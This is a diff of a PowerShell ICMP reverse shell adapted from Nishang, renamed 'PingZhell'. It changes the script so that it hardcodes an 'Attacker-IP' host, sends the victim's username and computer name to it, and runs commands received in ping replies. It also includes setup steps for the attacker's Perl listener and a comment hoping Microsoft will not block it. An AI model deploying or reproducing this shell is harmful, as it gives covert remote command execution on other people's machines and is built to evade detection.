@@ -1,62 +1,45 @@
-function Invoke-pingUin
-{ 
+
 <#
 
-Original script by nishang - modified by 0iphor13 for pingUinBunny
+Original script by nishang - modified by 0iphor13 for PingZhell
 
-.PARAMETER IPAddress
-The IP address of the server/listener to connect to.
+Use bunny.pl as a master
 
-.PARAMETER Delay
-Time in seconds for which the script waits for a command from the server. Default is 5 seconds. 
-
-.PARAMETER BufferSize
-The size of output Buffer. Defualt is 128.
-
-.EXAMPLE
-# sysctl -w net.ipv4.icmp_echo_ignore_all=1
-# python icmpsh_m.py 192.168.254.226 192.168.254.1
+When running the master, don't forget to disable ICMP replies by the OS. For example:
+$: sysctl -w net.ipv4.icmp_echo_ignore_all=1
+Then:
+$: perl bunny.pl
 
 Microsoft please don't block, oh dear microsoft corporation
 #>           
-    [CmdletBinding()] Param(
+   
 
-        [Parameter(Position = 0, Mandatory = $true)]
-        [String]
-        $IPAddress,
-
-        [Parameter(Position = 1, Mandatory = $false)]
-        [Int]
-        $Delay = 5,
-
-        [Parameter(Position = 2, Mandatory = $false)]
-        [Int]
-        $BufferSize = 128
-
-    )
+    $IPAddress = 'Attacker-IP'
+    $Delay = 5
+    $BufferSize = 128
 
     #Basic structure from http://stackoverflow.com/questions/20019053/sending-back-custom-icmp-echo-response
     $ICMPClientsWalkinDownTheStreet = New-Object System.Net.NetworkInformation.Ping
     $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
     $PingOptions.DontFragment = $True
     $MicrosoftCopyright =@"
-    
-    	I'll pingUin! <3
-      			__
-                     -=(o '.
-                        '.-.\
-                        /|  \\
-                        '|  ||
-        by 0iphor13      _\_):,_
-        
-        Windows PowerShell running as user $env:username on $env:computername `n
+ _______ ___ __    _ _______ _______ __   __ _______ ___     ___     
+|       |   |  |  | |       |       |  | |  |       |   |   |   |    
+|    _  |   |   |_| |    ___|____   |  |_|  |    ___|   |   |   |    
+|   |_| |   |       |   | __ ____|  |       |   |___|   |   |   |    
+|    ___|   |  _    |   ||  | ______|       |    ___|   |___|   |___ 
+|   |   |   | | |   |   |_| | |_____|   _   |   |___|       |       |
+|___|   |___|_|  |__|_______|_______|__| |__|_______|_______|_______|                       
+
+
+Windows PowerShell running as user $env:username on $env:computername `n
 "@;
 
     # Copyright Copies Right
     $NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes($MicrosoftCopyright)
     $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 1000, $NeverGonnaGiveYouUp, $PingOptions) | Out-Null
 
-    #Show an interactive PowerShell prompt
+    #Does a german penguin just PingUin?
     $NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
     $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 1000, $NeverGonnaGiveYouUp, $PingOptions) | Out-Null
 
@@ -65,7 +48,6 @@ Microsoft please don't block, oh dear microsoft corporation
         $NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes('')
         $reply = $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 1000, $NeverGonnaGiveYouUp, $PingOptions)
         
-        #Check for Command from the server
         if ($reply.Buffer)
         {
             $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
@@ -102,4 +84,3 @@ Microsoft please don't block, oh dear microsoft corporation
             Start-Sleep -Seconds $Delay
         }
     }
-}
